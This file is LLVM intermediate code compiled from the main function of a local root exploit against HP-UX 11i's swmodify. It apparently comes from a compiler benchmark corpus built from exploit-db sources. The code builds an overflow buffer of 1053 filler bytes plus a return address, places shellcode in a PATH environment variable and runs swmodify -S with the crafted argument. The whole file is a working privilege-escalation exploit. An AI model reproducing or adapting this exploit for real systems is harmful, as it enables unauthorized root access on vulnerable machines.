; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_2634.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_2634.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [43 x i8] c"[ HP-UX 11i 'swmodify' local root exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"PATH=\00", align 1
@shellcode = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [19 x i8] c"/usr/sbin/swmodify\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"swmodify\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-S\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4 x i8], align 1
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca [1 x i8*], align 8
  %7 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %9 = bitcast i8* %8 to i64*
  store i64 2139030580, i64* %9, align 1
  %10 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  %11 = call i64 @malloc(i32 2048)
  %12 = inttoptr i64 %11 to i8*
  store i8* %12, i8** %3, align 8
  %13 = load i8*, i8** %3, align 8
  store i8* %13, i8** %4, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @memset(i8* %14, i8 signext 0, i32 2048)
  %16 = load i8*, i8** %3, align 8
  %17 = call i32 @memset(i8* %16, i8 signext 97, i32 1053)
  %18 = load i8*, i8** %3, align 8
  %19 = getelementptr inbounds i8, i8* %18, i64 1053
  store i8* %19, i8** %3, align 8
  store i32 0, i32* %7, align 4
  br label %20

20:                                               ; preds = %31, %0
  %21 = load i32, i32* %7, align 4
  %22 = icmp slt i32 %21, 4
  br i1 %22, label %23, label %34

23:                                               ; preds = %20
  %24 = load i32, i32* %7, align 4
  %25 = srem i32 %24, 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = load i8*, i8** %3, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %3, align 8
  store i8 %28, i8* %29, align 1
  br label %31

31:                                               ; preds = %23
  %32 = load i32, i32* %7, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %7, align 4
  br label %20

34:                                               ; preds = %20
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %3, align 8
  store i8 ptrtoint ([2 x i8]* @.str.1 to i8), i8* %35, align 1
  %37 = call i64 @malloc(i32 2048)
  %38 = inttoptr i64 %37 to i8*
  store i8* %38, i8** %5, align 8
  %39 = load i8*, i8** %5, align 8
  store i8* %39, i8** %3, align 8
  %40 = load i8*, i8** %5, align 8
  %41 = call i32 @memset(i8* %40, i8 signext 0, i32 2048)
  %42 = load i8*, i8** %5, align 8
  %43 = call i32 @sprintf(i8* %42, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %44 = load i8*, i8** %3, align 8
  %45 = getelementptr inbounds i8, i8* %44, i64 5
  store i8* %45, i8** %3, align 8
  store i32 0, i32* %7, align 4
  br label %46

46:                                               ; preds = %60, %34
  %47 = load i32, i32* %7, align 4
  %48 = load i32*, i32** @shellcode, align 8
  %49 = call i32 @strlen(i32* %48)
  %50 = icmp slt i32 %47, %49
  br i1 %50, label %51, label %63

51:                                               ; preds = %46
  %52 = load i32*, i32** @shellcode, align 8
  %53 = load i32, i32* %7, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i32, i32* %52, i64 %54
  %56 = load i32, i32* %55, align 4
  %57 = trunc i32 %56 to i8
  %58 = load i8*, i8** %3, align 8
  %59 = getelementptr inbounds i8, i8* %58, i32 1
  store i8* %59, i8** %3, align 8
  store i8 %57, i8* %58, align 1
  br label %60

60:                                               ; preds = %51
  %61 = load i32, i32* %7, align 4
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %7, align 4
  br label %46

63:                                               ; preds = %46
  %64 = load i8*, i8** %5, align 8
  %65 = getelementptr inbounds [1 x i8*], [1 x i8*]* %6, i64 0, i64 0
  store i8* %64, i8** %65, align 8
  %66 = getelementptr inbounds [1 x i8*], [1 x i8*]* %6, i64 0, i64 1
  store i8* null, i8** %66, align 8
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds [1 x i8*], [1 x i8*]* %6, i64 0, i64 0
  %69 = call i32 @execle(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %67, i32 0, i8** %68)
  %70 = load i32, i32* %1, align 4
  ret i32 %70
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
